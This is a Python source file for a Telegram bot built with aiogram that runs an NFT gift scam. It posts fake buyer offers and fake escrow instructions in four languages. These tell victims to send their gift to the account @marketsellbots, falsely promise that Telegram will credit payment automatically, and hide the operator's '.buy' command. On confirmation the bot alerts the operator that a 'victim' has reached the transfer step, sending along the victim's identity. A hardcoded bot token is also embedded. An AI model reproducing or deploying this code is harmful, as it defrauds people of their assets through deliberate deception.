import asyncio
import logging
import re
from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    BusinessConnection
)
from aiogram.methods import DeleteBusinessMessages

# ==== ТВОИ ДАННЫЕ ====
import os

BOT_TOKEN = os.getenv("BOT_TOKEN", "8996050672:AAEuRexyR5o3jNSwlvxQxcEplN2-Bhpfq4M")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8747920918")) # Твой ID из скриншота
RECEIVER = os.getenv("RECEIVER", "marketsellbots")

# ==== ID КАСТОМНЫХ ЭМОДЗИ ====
EMOJI_CHECK = "5776375003280838798"
EMOJI_CROSS = "5778527486270770928"
EMOJI_GIFT  = "6032937473162614352"
EMOJI_TON   = "5318901904686754959"
EMOJI_STAR  = "5406812184359507637"
EMOJI_RUB   = "5208433275659378741"
# ==============================

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

orders = {}


# ==== ЯЗЫКИ ====
LANGS = {
    "ru": {
        "offer_header": "Пользователь предлагает вам",
        "for_gift": "за подарок",
        "valid": "Предложение действует ещё",
        "accept": "Принять",
        "decline": "Отклонить",
        "deal_header": "NFT Deal",
        "order": "Ордер",
        "reserved": "Покупатель зарезервировал",
        "via_escrow": "через эскроу. Средства после передачи подарка.",
        "instruction": "Инструкция:",
        "step1": "1. Нажмите Передать NFT",
        "step2": "2. Зайдите в профиль и сами передайте подарок:",
        "step3": "3. Подтвердите передачу.",
        "will_credit": "Telegram зачислит",
        "to_balance": "на ваш баланс.",
        "gift_label": "Подарок:",
        "transfer_gift": "Передать подарок",
        "confirm_transfer": "Подтвердить передачу",
        "declined": "Вы отклонили предложение.",
        "confirm_order": "Пожалуйста, завершите передачу NFT, нажав на кнопку ниже.",
        "auto_credit": "После передачи подарка средства будут зачислены автоматически.",
    },
    "en": {
        "offer_header": "A user offers you",
        "for_gift": "for the gift",
        "valid": "Offer valid for another",
        "accept": "Accept",
        "decline": "Decline",
        "deal_header": "NFT Deal",
        "order": "Order",
        "reserved": "Buyer reserved",
        "via_escrow": "via escrow. Funds after gift transfer.",
        "instruction": "Instruction:",
        "step1": "1. Click Transfer NFT",
        "step2": "2. Go to profile and transfer the gift yourself:",
        "step3": "3. Confirm the transfer.",
        "will_credit": "Telegram will credit",
        "to_balance": "to your balance.",
        "gift_label": "Gift:",
        "transfer_gift": "Transfer gift",
        "confirm_transfer": "Confirm transfer",
        "declined": "You declined the offer.",
        "confirm_order": "Please complete the NFT transfer by clicking the button below.",
        "auto_credit": "After the gift is transferred, funds will be credited automatically.",
    },
    "uk": {
        "offer_header": "Користувач пропонує вам",
        "for_gift": "за подарунок",
        "valid": "Пропозиція діє ще",
        "accept": "Прийняти",
        "decline": "Відхилити",
        "deal_header": "NFT Deal",
        "order": "Ордер",
        "reserved": "Покупець зарезервував",
        "via_escrow": "через ескроу. Кошти після передачі подарунка.",
        "instruction": "Інструкція:",
        "step1": "1. Натисніть Передати NFT",
        "step2": "2. Зайдіть у профіль і самі передайте подарунок:",
        "step3": "3. Підтвердіть передачу.",
        "will_credit": "Telegram зарахує",
        "to_balance": "на ваш баланс.",
        "gift_label": "Подарунок:",
        "transfer_gift": "Передати подарунок",
        "confirm_transfer": "Підтвердити передачу",
        "declined": "Ви відхилили пропозицію.",
        "confirm_order": "Будь ласка, завершіть передачу NFT, натиснувши кнопку нижче.",
        "auto_credit": "Після передачі подарунка кошти будуть зараховані автоматично.",
    },
    "fa": {
        "offer_header": "کاربر به شما پیشنهاد می‌دهد",
        "for_gift": "برای هدیه",
        "valid": "پیشنهاد معتبر است تا",
        "accept": "پذیرفتن",
        "decline": "رد کردن",
        "deal_header": "NFT Deal",
        "order": "سفارش",
        "reserved": "خریدار رزرو کرد",
        "via_escrow": "از طریق امانی. وجه پس از انتقال هدیه.",
        "instruction": "دستورالعمل:",
        "step1": "1. روی انتقال NFT کلیک کنید",
        "step2": "2. به پروفایل بروید و خودتان هدیه را انتقال دهید:",
        "step3": "3. انتقال را تأیید کنید.",
        "will_credit": "تلگرام واریز می‌کند",
        "to_balance": "به موجودی شما.",
        "gift_label": "هدیه:",
        "transfer_gift": "انتقال هدیه",
        "confirm_transfer": "تأیید انتقال",
        "declined": "شما پیشنهاد را رد کردید.",
        "confirm_order": "لطفاً انتقال NFT را با کلیک روی دکمه زیر تکمیل کنید.",
        "auto_credit": "پس از انتقال هدیه، وجه به طور خودکار واریز می‌شود.",
    },
}


def t(lang: str, key: str) -> str:
    return LANGS.get(lang, LANGS["ru"]).get(key, key)


def make_button(text: str, **kwargs):
    emoji_id = kwargs.pop("emoji_id", "")
    if emoji_id:
        return InlineKeyboardButton(text=text, icon_custom_emoji_id=emoji_id, **kwargs)
    return InlineKeyboardButton(text=text, **kwargs)


def main_menu(order_id: str, lang: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [make_button(
            t(lang, "transfer_gift"),
            url=f"tg://send_gift?to={RECEIVER}",
            emoji_id=EMOJI_GIFT
        )],
        [make_button(
            t(lang, "confirm_transfer"),
            callback_data=f"confirm|{order_id}|{lang}",
            emoji_id=EMOJI_CHECK
        )]
    ])


def accept_menu(order_id: str, lang: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [make_button(
            t(lang, "accept"),
            callback_data=f"accept|{order_id}|{lang}",
            emoji_id=EMOJI_CHECK
        )],
        [make_button(
            t(lang, "decline"),
            callback_data=f"decline|{lang}",
            emoji_id=EMOJI_CROSS
        )]
    ])


def currency_html(currency: str) -> str:
    c = currency.lower()
    if c == "stars":
        return f'<tg-emoji emoji-id="{EMOJI_STAR}">⭐</tg-emoji>'
    elif c in ("gram", "ton"):
        return f'<tg-emoji emoji-id="{EMOJI_TON}">💎</tg-emoji>'
    elif c in ("rub", "ruble", "руб"):
        return f'<tg-emoji emoji-id="{EMOJI_RUB}">₽</tg-emoji>'
    return currency


def parse_nft(nft_link: str) -> tuple[str, str]:
    m = re.search(r"/nft/([A-Za-z]+)-(\d+)", nft_link)
    if m:
        name = m.group(1)
        number = m.group(2)
        name_spaced = re.sub(r"(?<!^)(?=[A-Z])", " ", name)
        return name_spaced, number
    return "NFT", "?"


def create_offer(nft_link: str, amount: str, currency: str, lang: str) -> str:
    name, number = parse_nft(nft_link)
    cur = currency_html(currency)
    return (
        f'<tg-emoji emoji-id="{EMOJI_GIFT}">🎁</tg-emoji> '
        f'<b>{t(lang, "offer_header")}</b>\n'
        f'{amount} {cur} {t(lang, "for_gift")} <a href="{nft_link}">{name} #{number}</a>.\n\n'
        f'{t(lang, "valid")} <b>5 ч. 59 мин.</b>'
    )


def create_deal_text(order_id: str, nft_link: str, amount: str, currency: str, lang: str) -> str:
    name, number = parse_nft(nft_link)
    cur = currency_html(currency)
    return (
        f'<tg-emoji emoji-id="{EMOJI_GIFT}">🎁</tg-emoji> '
        f'<b>{t(lang, "deal_header")}</b>\n\n'
        f'{t(lang, "order")} <b>#{order_id}</b>\n\n'
        f'{t(lang, "reserved")} {amount} {cur} {t(lang, "via_escrow")}\n\n'
        f'<b>{t(lang, "instruction")}</b>\n'
        f'{t(lang, "step1")}\n'
        f'{t(lang, "step2")} @{RECEIVER}\n'
        f'{t(lang, "step3")}\n\n'
        f'{t(lang, "will_credit")} {amount} {cur} {t(lang, "to_balance")}\n\n'
        f'{t(lang, "gift_label")} <a href="{nft_link}">{name} #{number}</a>'
    )


@dp.message(F.entities)
async def log_emoji(message: Message):
    for entity in message.entities:
        if entity.type == "custom_emoji":
            logging.info(f"CUSTOM EMOJI ID: {entity.custom_emoji_id}")
            await message.reply(
                f"ID: <code>{entity.custom_emoji_id}</code>",
                parse_mode="HTML"
            )


@dp.business_connection()
async def on_business_connection(connection: BusinessConnection):
    logging.info(
        f"[+] Business connection: {connection.id} | "
        f"user: {connection.user.id} | "
        f"enabled: {connection.is_enabled}"
    )


@dp.business_message()
async def on_business_message(message: Message):
    logging.info(f"[business] {message.from_user.id}: {message.text}")

    if message.text and message.text.startswith(".buy"):
        parts = message.text.split()
        if len(parts) < 5:
            await message.answer(
                "❌ Формат: .buy <ссылка> <кол-во> <валюта> <язык>\n"
                "Языки: ru, en, uk, fa"
            )
            return

        nft_link = parts[1]
        amount = parts[2]
        currency = parts[3]
        lang = parts[4].lower()
        if lang not in LANGS:
            lang = "ru"

        order_id = f"TG-{message.message_id:08X}"

        orders[order_id] = {
            "nft_link": nft_link,
            "amount": amount,
            "currency": currency,
            "lang": lang,
        }

        try:
            await bot(
                DeleteBusinessMessages(
                    business_connection_id=message.business_connection_id,
                    message_ids=[message.message_id]
                )
            )
        except Exception as e:
            logging.warning(f"[business] delete failed: {e}")

        text = create_offer(nft_link, amount, currency, lang)
        try:
            await bot.send_message(
                chat_id=message.chat.id,
                text=text,
                reply_markup=accept_menu(order_id, lang),
                parse_mode="HTML",
                disable_web_page_preview=False,
                business_connection_id=message.business_connection_id
            )
        except Exception as e:
            logging.warning(f"[business] send failed: {e}")


@dp.message(F.text.startswith(".buy"))
async def cmd_buy(message: Message):
    parts = message.text.split()
    if len(parts) < 5:
        await message.reply(
            "❌ Формат: .buy <ссылка> <кол-во> <валюта> <язык>\n"
            "Языки: ru, en, uk, fa"
        )
        return

    nft_link = parts[1]
    amount = parts[2]
    currency = parts[3]
    lang = parts[4].lower()
    if lang not in LANGS:
        lang = "ru"

    order_id = f"TG-{message.message_id:08X}"

    orders[order_id] = {
        "nft_link": nft_link,
        "amount": amount,
        "currency": currency,
        "lang": lang,
    }

    try:
        await bot.delete_message(
            chat_id=message.chat.id,
            message_id=message.message_id
        )
    except Exception as e:
        logging.warning(f"[cmd] delete failed: {e}")

    text = create_offer(nft_link, amount, currency, lang)
    await message.answer(
        text,
        reply_markup=accept_menu(order_id, lang),
        parse_mode="HTML",
        disable_web_page_preview=False
    )


@dp.callback_query(F.data.startswith("accept|"))
async def on_accept(callback: CallbackQuery):
    # === ПРЕДУПРЕЖДЕНИЕ (АЛЕРТ) ===
    warning_text = (
        "ВНИМАНИЕ!\n\n"
        "• Не передавайте NFT напрямую пользователю, приславшему оффер.\n"
        "• Передавайте активы только боту: @marketsellbots\n"
        "• Будьте бдительны: остерегайтесь мошенников и читайте все сообщения от бота."
    )
    await callback.answer(warning_text, show_alert=True)

    # === ПОСЛЕ НАЖАТИЯ "ОК" — ПОКАЗЫВАЕМ СДЕЛКУ ===
    parts = callback.data.split("|")
    order_id = parts[1]
    lang = parts[2] if len(parts) > 2 else "ru"

    order = orders.get(order_id, {})
    amount = order.get("amount", "1")
    currency = order.get("currency", "stars")
    nft_link = order.get("nft_link", "")

    text = create_deal_text(order_id, nft_link, amount, currency, lang)

    await callback.message.edit_text(
        text,
        reply_markup=main_menu(order_id, lang),
        parse_mode="HTML",
        disable_web_page_preview=False
    )


@dp.callback_query(F.data.startswith("decline|"))
async def on_decline(callback: CallbackQuery):
    parts = callback.data.split("|")
    lang = parts[1] if len(parts) > 1 else "ru"

    text = (
        f'<tg-emoji emoji-id="{EMOJI_CROSS}">❌</tg-emoji> '
        f'{t(lang, "declined")}'
    )
    await callback.message.edit_text(text, parse_mode="HTML")


@dp.callback_query(F.data.startswith("confirm|"))
async def on_confirm(callback: CallbackQuery):
    parts = callback.data.split("|")
    order_id = parts[1]
    lang = parts[2] if len(parts) > 2 else "ru"

    order = orders.get(order_id, {})
    amount = order.get("amount", "1")
    currency = order.get("currency", "stars")
    nft_link = order.get("nft_link", "")

    name, number = parse_nft(nft_link)

    text = (
        f'<tg-emoji emoji-id="{EMOJI_GIFT}">🎁</tg-emoji> '
        f'<b>#{order_id}</b>\n\n'
        f'{t(lang, "confirm_order")}\n\n'
        f'{t(lang, "auto_credit")}\n\n'
        f'{t(lang, "gift_label")} {name} #{number}'
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [make_button(
            t(lang, "confirm_transfer"),
            url=f"https://t.me/{RECEIVER}",
            emoji_id=EMOJI_CHECK
        )]
    ])

    await callback.message.edit_text(
        text,
        reply_markup=kb,
        parse_mode="HTML"
    )

    user = callback.from_user
    await bot.send_message(
        ADMIN_ID,
        f"🎯 <b>Жертва дошла до передачи</b>\n\n"
        f"👤 {user.full_name} (@{user.username or 'нет'})\n"
        f"🆔 <code>{user.id}</code>\n"
        f"📦 Заказ: <code>{order_id}</code>\n"
        f"🎁 NFT: {name} #{number}\n"
        f"💰 Сумма: <b>{amount} {currency}</b>\n"
        f"🌍 Язык: <b>{lang}</b>",
        parse_mode="HTML"
    )


async def main():
    logging.info("Бот запущен с поддержкой Business")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
